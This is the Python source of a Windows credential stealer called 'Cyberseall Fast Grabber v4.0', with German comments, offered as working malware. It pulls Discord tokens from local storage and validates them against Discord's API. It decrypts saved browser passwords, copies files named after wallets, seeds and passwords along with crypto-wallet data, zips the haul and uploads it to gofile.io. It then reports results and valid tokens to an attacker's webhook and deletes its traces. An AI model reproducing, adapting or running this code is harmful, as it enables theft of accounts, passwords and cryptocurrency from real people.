import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
try:from Crypto.Cipher import AES
except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.fi()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt_token(buff, master_key):
                try:
                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return None
            
            # Nur die wichtigsten und häufigsten Browser für bessere Performance
            paths = {
                'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
                'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
                'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
                'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
                'Chrome Canary': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data', 'Default'),
                'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
                'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
                'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
                'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
                'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default'),
                'Firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
            }
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            for platform, path in paths.items():
                try:
                    if not os.path.exists(path):
                        continue
                    
                    # Für Discord und Browser-Token-Suche
                    if 'discord' in platform.lower():
                        leveldb_path = path + "\\Local Storage\\leveldb\\"
                    else:
                        leveldb_path = path + "\\Local Storage\\leveldb\\"
                        
                    if not os.path.exists(leveldb_path):
                        continue
                        
                    # Nur die wichtigsten Dateien durchsuchen
                    for file in os.listdir(leveldb_path)[:10]:  # Limit auf 10 Dateien
                        if not (file.endswith(".ldb") or file.endswith(".log")):
                            continue
                        try:
                            with open(leveldb_path + file, "r", errors='ignore') as files:
                                content = files.read()
                                # Nur Discord-Token-Pattern suchen
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\\['(.*)\'\\].*$][^\\\"]*", content):
                                    tokens.append(values)
                        except:
                            continue
                except:
                    continue
            
            # Token-Bereinigung
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            
            # Token-Entschlüsselung (nur für die ersten 20 Token)
            for token in cleaned[:20]:
                try:
                    # Vereinfachte Entschlüsselung
                    if 'dQw4w9WgXcQ:' in token:
                        self.t.append(token.split('dQw4w9WgXcQ:')[1])
                except:
                    pass
            
            # Entferne Duplikate
            self.t = list(set(self.t))[:10]  # Limit auf 10 Token
            
        except:
            pass

    def validate_tokens(self):
        valid_tokens = []
        for token in self.t[:5]:  # Nur die ersten 5 Token validieren
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                if r.status_code == 200:
                    user_data = r.json()
                    token_info = {
                        'token': token,
                        'username': user_data.get('username', 'Unknown'),
                        'discriminator': user_data.get('discriminator', '0000'),
                        'id': user_data.get('id', 'Unknown'),
                        'email': user_data.get('email', 'Hidden'),
                        'verified': user_data.get('verified', False),
                        'mfa_enabled': user_data.get('mfa_enabled', False),
                        'premium_type': user_data.get('premium_type', 0)
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            pw_data = []
            
            def get_chrome_key():
                try:
                    local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                except:
                    return None
            
            def decrypt_password(password, key):
                try:
                    if not password or len(password) < 15:
                        return "Failed to decrypt"
                    try:
                        iv = password[3:15]
                        password = password[15:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        return cipher.decrypt(password)[:-16].decode()
                    except:
                        return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
                except:
                    return "Failed to decrypt"
            
            chrome_key = get_chrome_key()
            
            # Nur die wichtigsten Browser für bessere Performance
            browsers = [
                ("Chrome", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")),
                ("Edge", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")),
                ("Brave", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")),
                ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")),
                ("Firefox", os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"))
            ]
            
            for b, bp in browsers:
                if os.path.exists(bp):
                    if "Firefox" in b:
                        # Firefox-spezifische Behandlung (vereinfacht)
                        for root, dirs, files in os.walk(bp):
                            for file in files[:5]:  # Limit auf 5 Dateien
                                if file == "logins.json":
                                    try:
                                        with open(os.path.join(root, file), 'r') as f:
                                            data = json.load(f)
                                            for login in data.get('logins', [])[:10]:  # Limit auf 10 Logins
                                                pw_data.append(b + " - " + login['hostname'] + " - " + login['username'] + " - [FIREFOX_ENCRYPTED]")
                                    except:
                                        pass
                                    break
                            break
                    else:
                        try:
                            tp = os.path.join(os.getenv("TEMP"), b.replace(" ", "_") + "_" + str(os.getpid()) + ".db")
                            shutil.copy2(bp, tp)
                            cn = sqlite3.connect(tp)
                            cr = cn.cursor()
                            cr.execute("SELECT origin_url,username_value,password_value FROM logins LIMIT 20")  # Limit auf 20
                            
                            for u, n, pw in cr.fetchall():
                                if n and pw:
                                    decrypted = "Failed to decrypt"
                                    if chrome_key:
                                        decrypted = decrypt_password(pw, chrome_key)
                                    pw_data.append(b + " - " + u + " - " + n + " - " + decrypted)
                            cn.close()
                            os.remove(tp)
                        except:
                            pass
                    
                    if len(pw_data) >= 50:  # Limit auf 50 Passwörter
                        break
            
            self.p = pw_data
            with open(os.path.join(self.d, "passwords.txt"), "w") as f:
                f.write("\n".join(pw_data))
        except:
            pass

    def fi(self):
        try:
            files_data = []
            
            # Nur die wichtigsten Verzeichnisse durchsuchen
            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        for f in fs[:10]:  # Limit auf 10 Dateien pro Verzeichnis
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat')) and os.path.getsize(os.path.join(r,f)) < 1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 10:
                                    break
                        if len(files_data) >= 10:
                            break
                    if len(files_data) >= 10:
                        break
            
            # Nur die wichtigsten Crypto-Wallets für bessere Performance
            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi")
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs[:5]:  # Limit auf 5 Dateien pro Wallet
                            if f.lower().endswith(('.wallet','.dat','.key','.json')) and os.path.getsize(os.path.join(r,f)) < 5*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:
            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            zf.write(fp, os.path.relpath(fp, self.d))
            
            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:
            embed = {
                "embeds": [{
                    "title": "🔥 CYBERSEALL FAST GRABBER v4.0",
                    "color": 0xff0000,
                    "fields": [
                        {
                            "name": "💎 Results",
                            "value": "```" + str(len(set(self.t))) + " Raw Tokens\n" + str(len(self.vt)) + " Valid Tokens\n" + str(len(self.p)) + " Browser Passwords\n" + str(len(self.f)) + " Keyword Files```"
                        },
                        {
                            "name": "💻 Target",
                            "value": "```" + getpass.getuser() + "@" + os.getenv("COMPUTERNAME", "?") + "```"
                        },
                        {
                            "name": "📁 Download",
                            "value": "[**CLICK HERE TO DOWNLOAD**](" + str(self.link if hasattr(self, 'link') else 'Failed') + ")",
                            "inline": False
                        }
                    ],
                    "footer": {"text": "Cyberseall FAST Grabber v4.0 - Optimized for Speed"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
            # Nur die ersten 2 validen Token senden
            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:2]):
                    token_embed = {
                        "embeds": [{
                            "title": "✅ VALID TOKEN #" + str(i+1),
                            "color": 0x00ff00,
                            "fields": [
                                {
                                    "name": "👤 User",
                                    "value": "```" + token_info.get('username', '?') + "#" + token_info.get('discriminator', '?') + "```"
                                },
                                {
                                    "name": "📧 Email",
                                    "value": "```" + str(token_info.get('email', 'Hidden')) + "```"
                                },
                                {
                                    "name": "🔐 Token",
                                    "value": "```" + token_info['token'][:50] + "...```"
                                }
                            ],
                            "footer": {"text": "Valid Token Info"},
                            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                        }]
                    }
                    requests.post(self.w, json=token_embed, timeout=5)
        except:
            pass

    def cleanup(self):
        try:
            time.sleep(1)
            if os.path.exists(self.d):
                shutil.rmtree(self.d, ignore_errors=True)
        except:
            pass

# WEBHOOK_PLACEHOLDER wird durch die Mini-Payload ersetzt
if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
